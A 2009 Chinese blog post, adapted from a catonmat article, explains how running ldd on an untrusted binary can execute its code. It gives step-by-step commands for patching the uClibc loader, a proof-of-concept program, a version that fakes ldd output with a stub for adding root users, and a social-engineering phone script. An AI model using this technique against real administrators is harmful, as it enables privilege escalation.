# ldd 的一个安全问题
>date: 2009-10-28T00:15:46+08:00


我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。


首先，我们先来了解一下，我们怎么来使用ldd的，请你看一下下面的几个命令：



```
(1) $ ldd /bin/grep
        linux-gate.so.1 =>  (0xffffe000)
        libc.so.6 => /lib/libc.so.6 (0xb7eca000)
        /lib/ld-linux.so.2 (0xb801e000)

(2) $ LD_TRACE_LOADED_OBJECTS=1 /bin/grep
        linux-gate.so.1 =>  (0xffffe000)
        libc.so.6 => /lib/libc.so.6 (0xb7e30000)
        /lib/ld-linux.so.2 (0xb7f84000)

(3) $ LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep
        linux-gate.so.1 =>  (0xffffe000)
        libc.so.6 => /lib/libc.so.6 (0xb7f7c000)
        /lib/ld-linux.so.2 (0xb80d0000)
```

第(1)个命令，我们运行了 `ldd` 于 `/bin/grep`。我们可以看到命令的输出是我们想要的，那就是 `/bin/grep` 所依赖的动态链接库。


第(2)个命令设置了一个叫 LD\_TRACE\_LOADED\_OBJECTS 的环境变量，然后就好像在运行命令 `/bin/grep` (但其实并不是)。 其运行结果和ldd的输出是一样的！


第(3)个命令也是设置了环境变量 LD\_TRACE\_LOADED\_OBJECTS ，然后调用了动态链接库 `ld-linux.so` 并把 `/bin/grep` 作为参数传给它。我们发现，其输出结果还是和前面两个一样的。





目录



* [具体发生了什么？](#%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F "具体发生了什么？")
* [编译一个新的装载器](#%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8 "编译一个新的装载器")
* [小试 牛刀](#%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80 "小试 牛刀")
* [邪恶的程序](#%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F "邪恶的程序")
* [邪恶的电话](#%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D "邪恶的电话")

#### 具体发生了什么？


对于第二个和第三个命令来说，好像是对 `ldd` 的一个包装或是一个隐式调用。对于第二个和第三个命令来说， `/bin/grep` 这个命令就根本没有被运行。这是一个GNU动态载入器的怪异的特性。如果其注意到环境变量LD\_TRACE\_LOADED\_OBJECTS 被设置了，那么它就不会去执行那个可运行的程序，而去输出这个可执行程序所依赖的动态链接库 （在BSD 系统上的`ldd` 是一个C 程序)。


如果你使用的是Linux，那么，你可以去看看 `ldd` 程序，你会发现这是一个 bash 的脚本。如果你仔细查看这个脚本的源码，你会发现，第二个命令和第三个命令的差别就在于 `ld-linux.so` 装载器是否可以被`ldd`所装载，如果不能，那就是第二个命令，如果而的话，那就是第三个命令。


所以，如果我们可以让`ld-linux.so` 装载器失效的话，或是让别的装载器来取代这个系统默认的动态链接库的话，那么我们就可以让 `ldd`来载入并运行我们想要程序了——使用不同的载装器并且不处理LD\_TRACE\_LOADED\_OBJECTS 环境变量，而是直接运行程序。


例如，你可以创建一个具有恶意的程序，如： ~/app/bin/exec 并且使用他自己的装载器 ~/app/lib/loader.so。如果某人（比如超级用户root） 运行了 `ldd /home/you/app/bin/exec` ，于是，他就玩完了。因为，那并不会列出所依赖的动态链接库，而是，直接执行你的那个恶意程序，这相当于，那个用户给了你他的授权。


#### 编译一个新的装载器


下载 [uClibc](http://www.uclibc.org/) C库。这是一个相当漂亮的代码，并且可以非常容易地修改一下源代码，使其忽略LD\_TRACE\_LOADED\_OBJECTS 检查。



```
$ mkdir app
$ cd app
app$ wget 'http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2'
```

解压这个包，并执行 `make menuconfig`，选项你的平台架构（比如：i386），剩下的事情保持不变。



```
$ bunzip2 < uClibc-0.9.30.1.tar.bz2 | tar -vx
$ rm -rf uClibc-0.9.30.1.tar.bz2
$ cd uClibc-0.9.30.1
$ make menuconfig
```

编辑 .config 并设置目标安装目录：到 `/home/you/app/uclibc`，  

把下面两行



```
RUNTIME_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/"
DEVEL_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/usr/"
```

改成



```
RUNTIME_PREFIX="/home/you/app/uclibc/"
DEVEL_PREFIX="/home/you/app/uclibc/usr/"
```

现在你需要改动一下其源代码，让其忽略LD\_TRACE\_LOADED\_OBJECTS 环境变量的检查。 下面是个这修改的diff，你需要修改的是 `ldso/ldso/ldso.c` 文件。你可把下面的这个diff存成一个叫file的文件，然后运行这个命令：`patch -p0 < file`。如果你不这样做的话，那么，我们的黑客程序就无法工作，而我们的这个装载器还是会认为 `ldd` 想列出动态链接库的文件列表。


[patch]  

— ldso/ldso/ldso-orig.c 2009-10-25 00:27:12.000000000 +0300  

+++ ldso/ldso/ldso.c 2009-10-25 00:27:22.000000000 +0300  

@@ -404,9 +404,11 @@  

} #endif  

+ /\*  

if (\_dl\_getenv("LD\_TRACE\_LOADED\_OBJECTS", envp) != NULL) {  

trace\_loaded\_objects++;  

}  

+ \*/  

#ifndef \_\_LDSO\_LDD\_SUPPORT\_\_  

if (trace\_loaded\_objects) {  

[/patch]


下面让我们来编译并安装它。



```
$ make -j 4
$ make install
```

于是，我们的 uClibc 装载器就被安装了，并且libc 库指向了 /home/you/app/uclibc. 就这么简单，现在，我们需要做的就是把我们的uClibc的装载器 (app/lib/ld-uClibc.so.0)变成默认的。


#### 小试 牛刀


首先，先让我们来创建一个测试程序，这人程序也就是输出些自己的东西，这样可以让我们看到我们的程序被执行了。我们把这个程序放在 `app/bin/`下，叫“myapp.c”，下面是源代码



```
#include <stdio.h>
#include <stdlib.h>

int main() {
  if (getenv("LD_TRACE_LOADED_OBJECTS")) {
    printf("All your things are belong to me.\n");
  }
  else {
    printf("Nothing.\n");
  }
  return 0;
}
```

这是一个很简单的代码了，这段代码主要检查一下环境变量LD\_TRACE\_LOADED\_OBJECTS 是否被设置了，如果是，那么恶意程序执行，如果没有，那么程序什么也不发生。


下面是编译程序的命令，，大家可以看到，我们静态链接了一些函数库。我们并不想让LD\_LIBRARY\_PATH这个变量来发挥作用。



```
$ L=/home/you/app/uclibc
$ gcc -Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0 \
    -Wl,-rpath-link,$L/lib \
    -nostdlib \
    myapp.c -o myapp \
    $L/usr/lib/crt*.o \
    -L$L/usr/lib/ \
    -lc
```

下面是GCC的各个参数的解释：


* **-Wl,–dynamic-linker,$L/lib/ld-uClibc.so.0** — 指定一个新的装载器。
* **-Wl,-rpath-link,$L/lib** — 指定一个首要的动态装载器所在的目录，这个目录用于查找动态库。
* **-nostdlib** — 不使用系统标准库。
* **myapp.c -o myapp** — 编译myapp.c 成可执行文件 myapp,
* **$L/usr/lib/crt\*.o** — 静态链接runtime 代码
* **-L$L/usr/lib/** — libc 的目录（静态链接）
* **-lc** —  C 库


现在让我们来运行一下我们的 `myapp` （没有ldd，一切正常）



```
app/bin$ ./myapp
Nothing.
```

LD\_TRACE\_LOADED\_OBJECTS 没有设置，所以输出 “Nothing” 。


现在，让我们来使用 `ldd` 来看看这个程序的最大的影响力，让我们以root身份来干这个事。



```
$ su
Password:
# ldd ./myapp
All your things are belong to me.
```

哈哈，我们可以看到，ldd触发了我们的恶意代码。于是，我们偷了整个系统！


#### 邪恶的程序


下面这个例子更为实际一些，如果没有`ldd` ，那程序程序会报错 “error while loading shared libraries” ，这个错误信息会引诱你去去使用 `ldd` 去做检查，如果你是root的话，那么就整个系统就玩完了。而当你可以了 `ldd` 后，它会在干完坏事后，模仿正确的`ldd`的输出，告诉你 `libat.so.0` 不存在。


下面的代码仅仅是向你展示了一下整个想法，代码还需加工和改善。



```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

/*
This example pretends to have a fictitious library 'libat.so.0' missing.
When someone with root permissions runs `ldd this_program`, it does
something nasty in malicious() function.

I haven't implemented anything malicious but have written down some ideas
of what could be done.

This is, of course, a joke program. To make it look more real, you'd have
to bump its size, add some more dependencies, simulate trying to open the
missing library, detect if ran under debugger or strace and do absolutely
nothing suspicious, etc.
*/

void pretend_as_ldd()
{
    printf("\tlinux-gate.so.1 =>  (0xffffe000)\n");
    printf("\tlibat.so.0 => not found\n");
    printf("\tlibc.so.6 => /lib/libc.so.6 (0xb7ec3000)\n");
    printf("\t/lib/ld-linux.so.2 (0xb8017000)\n");
}

void malicious()
{
    if (geteuid() == 0) {
        /* we are root ... */
        printf("poof, all your box are belong to us\n");

        /* silently add a new user to /etc/passwd, */
        /* or create a suid=0 program that you can later execute, */
        /* or do something really nasty */
    }
}

int main(int argc, char **argv)
{
    if (getenv("LD_TRACE_LOADED_OBJECTS")) {
        malicious();
        pretend_as_ldd();
        return 0;
    }

    printf("%s: error while loading shared libraries: libat.so.0: "
           "cannot open shared object file: No such file or directory\n",
           argv[0]);
    return 127;
}
```

 


#### 邪恶的电话


事实上来说，上面的那段程序可能的影响更具破坏性，因为大多数的系统管理员可能并不知道不能使用 `ldd` 去测试那些不熟悉的执行文件。下面是一段很可能会发现的对话，让我们看看我们的程序是如何更快地获得系统管理员的权限的。


系统管理员的电话狂响……


系统管理员： “同志你好，我是系统管理员，有什么可以帮你的？”


黑客：“管理员同志你好。我有一个程序不能运行，总是报错，错误好像是说一个系统动态链接库有问题，你能不能帮我看看？”


系统管理员：“没问题，你的那个程序在哪里？”


黑客： “在我的home目录下，/home/hchen/app/bin/myapp”。


系统管理员：“ OK，等一会儿”，黑客在电话这头可以听到一些键盘的敲击声。


系统管理员：“好像是动态链接库的问题，你能告诉我你的程序具体需要什么样的动态链接库吗？”


黑客说: “谢谢，应该没有别的嘛。”


系统管理员：“嗯，查到了，说是没有了 `libat.so.0`这是你自己的动态链接库吗？”


黑客说：“哦，好像是的，你等一下，我看看……” 黑客在那头露出了邪恶的笑，并且，讯速地输入了下面的命令：


`mv ~/.hidden/working_app ~/app/bin/myapp`  

`mv ~/.hidden/libat.so.o ~/app/bin/`


黑客说：“哦，对了，的确是我的不对，我忘了把这个链接库拷过来了，现在应该可以了，谢谢你啊，真是不好意思，麻烦你了”


系统管理员： “没事就行了，下次注意啊！”（然后系统管理心里暗骂，TMD，又一个白痴用户！……）


**教训一：千万不要使用 `ldd` 去测试你不知道的文件！  

教训二：千万不要相信陌生人！**


文章：[来源](http://www.catonmat.net/blog/ldd-arbitrary-code-execution/)（以上文章并非完全翻译，我做过一些修改，所以，如果你要转载，请注明作者和出处）


